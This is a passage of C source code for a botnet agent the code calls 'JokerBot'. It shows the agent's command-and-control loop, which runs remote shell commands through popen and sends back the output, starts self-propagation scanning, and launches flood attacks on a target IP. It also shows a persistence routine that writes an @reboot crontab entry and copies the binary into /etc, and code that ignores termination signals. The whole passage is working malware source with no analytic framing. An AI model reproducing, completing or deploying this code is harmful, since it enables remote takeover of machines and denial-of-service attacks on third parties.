        printf("[BOT] Agent v%s connected to %s:%d\n", AGENT_VERSION, host, port);
        fflush(stdout);

        /* Register */
        char agent_id[17];
        snprintf(agent_id, sizeof(agent_id), "%02x%02x%02x%02x%02x%02x%02x%02x",
                 botnet_key[0], botnet_key[1], botnet_key[2], botnet_key[3],
                 botnet_key[4], botnet_key[5], botnet_key[6], botnet_key[7]);

        send_msg(sock, "register",
            "\"agent_id\": \"%s\", \"hostname\": \"%s\", \"ip\": \"%s\", "
            "\"platform\": \"linux\", \"arch\": \"%s\", \"version\": \"%s\"",
            agent_id, get_hostname(), "0.0.0.0", get_arch_str(), AGENT_VERSION);

        time_t next_hb = time(NULL) + HB_MIN + (rand() % (HB_MAX - HB_MIN));

        while (1) {
            char buf[4096];
            int n = recv_line(sock, buf, sizeof(buf));
            if (n <= 0) break;

            /* Parse JSON message */
            char msg_type[64];
            json_get_string(buf, "type", msg_type, sizeof(msg_type));

            if (strcmp(msg_type, "heartbeat") == 0) {
                /* Send pong */
                send_msg(sock, "pong", "\"agent_id\": \"%s\"", agent_id);
                next_hb = time(NULL) + HB_MIN + (rand() % (HB_MAX - HB_MIN));
            } else if (strcmp(msg_type, "command") == 0) {
                char cmd_type[64];
                json_get_string(buf, "command_type", cmd_type, sizeof(cmd_type));

                if (strcmp(cmd_type, "propagate") == 0) {
                    int threads = json_get_int(buf, "threads", 40);
                    stop_scan = 0;
                    start_scanner(threads);
                } else if (strcmp(cmd_type, "stop") == 0) {
                    stop_scan = 1;
                    scanner_active = 0;
                } else if (strcmp(cmd_type, "ping") == 0) {
                    /* Pong response via result */
                    send_msg(sock, "result", "\"output\": \"pong\"");
                } else if (strcmp(cmd_type, "sysinfo") == 0) {
                    send_msg(sock, "result",
                        "\"output\": \"{\\\"hostname\\\": \\\"%s\\\", \\\"arch\\\": \\\"%s\\\", \\\"version\\\": \\\"%s\\\"}\"",
                        get_hostname(), get_arch_str(), AGENT_VERSION);
                } else if (strcmp(cmd_type, "exec") == 0) {
                    /* Execute shell command */
                    char cmd[512];
                    json_get_string(buf, "command", cmd, sizeof(cmd));
                    FILE *fp = popen(cmd, "r");
                    if (fp) {
                        char out[2048];
                        int r = fread(out, 1, sizeof(out) - 1, fp);
                        out[r] = '\0';
                        pclose(fp);
                        /* Escape for JSON */
                        for (int i = 0; out[i]; i++) {
                            if (out[i] == '"') memmove(out + i + 1, out + i, strlen(out + i) + 1);
                        }
                        send_msg(sock, "result", "\"output\": \"%s\"", out);
                    } else {
                        send_msg(sock, "result", "\"output\": \"error\"");
                    }
                } else if (strcmp(cmd_type, "flood") == 0) {
                    char flood_type[32];
                    char target_ip[64];
                    json_get_string(buf, "flood_type", flood_type, sizeof(flood_type));
                    json_get_string(buf, "target_ip", target_ip, sizeof(target_ip));
                    int target_port = json_get_int(buf, "target_port", 80);
                    int duration = json_get_int(buf, "duration", 60);
                    int threads = json_get_int(buf, "threads", 1);

                    launch_attack(flood_type, target_ip, target_port, duration, threads);
                    send_msg(sock, "result", "\"output\": \"Attack completed\"");
                } else if (strcmp(cmd_type, "scan") == 0) {
                    int threads = json_get_int(buf, "threads", 40);
                    start_scanner(threads);
                }
            } else if (strcmp(msg_type, "gossip") == 0 || strcmp(msg_type, "peers") == 0) {
                next_hb = time(NULL) + HB_MIN + (rand() % (HB_MAX - HB_MIN));
            }

            /* Send heartbeat if due */
            if (time(NULL) >= next_hb) {
                send_msg(sock, "heartbeat", "\"ts\": %ld, \"agent_id\": \"%s\"", time(NULL), agent_id);
                next_hb = time(NULL) + HB_MIN + (rand() % (HB_MAX - HB_MIN));
            }
        }

        close(sock);
        sleep(rand() % 45 + 40);
    }
}

/* ============================================================
 * Persistence
 * ============================================================ */

static void install_persistence(void) {
    char cron_cmd[512];
#ifdef _WIN32
    /* No cron persistence on Windows */
    return;
#else
    /* Copy self to persistence locations */
    char exe_path[256];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len < 0) len = 0;
    exe_path[len > 0 ? len : 0] = '\0';

    if (len > 0) {
        snprintf(cron_cmd, sizeof(cron_cmd),
            "(crontab -l 2>/dev/null; echo '@reboot %s %s %d --install') | crontab -",
            exe_path, c2_host, c2_port);
    } else {
        snprintf(cron_cmd, sizeof(cron_cmd),
            "(crontab -l 2>/dev/null; echo '@reboot %s %s %d --install') | crontab -",
            "/tmp/.joker_bot", c2_host, c2_port);
    }
    system(cron_cmd);
    system("cp /tmp/.joker_bot /etc/.joker_bot 2>/dev/null");
#endif
}

/* ============================================================
 * Main
 * ============================================================ */

int main(int argc, char **argv) {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    srand(time(NULL) ^ _getpid());
#else
    srand(time(NULL) ^ getpid());
#endif
    rand_bytes(botnet_key, sizeof(botnet_key));

    /* Parse arguments */
    if (argc > 2) {
        strncpy(c2_host, argv[1], sizeof(c2_host) - 1);
        c2_port = atoi(argv[2]);
        if (c2_port <= 0) c2_port = DEFAULT_C2_PORT;
    }

    int do_install = 0;
    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "--install") == 0)
            do_install = 1;
    }

    printf("[BOT] JokerBot v%s starting - C2: %s:%d\n", AGENT_VERSION, c2_host, c2_port);
    fflush(stdout);

    /* Set architecture string for self-deployment */
    strncpy(bot_arch, get_arch_str(), sizeof(bot_arch) - 1);
    bot_arch[sizeof(bot_arch) - 1] = '\0';

    if (do_install) {
        install_persistence();
    }

    /* Set up signal handling */
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);

    agent_loop(c2_host, c2_port);

    return 0;
}
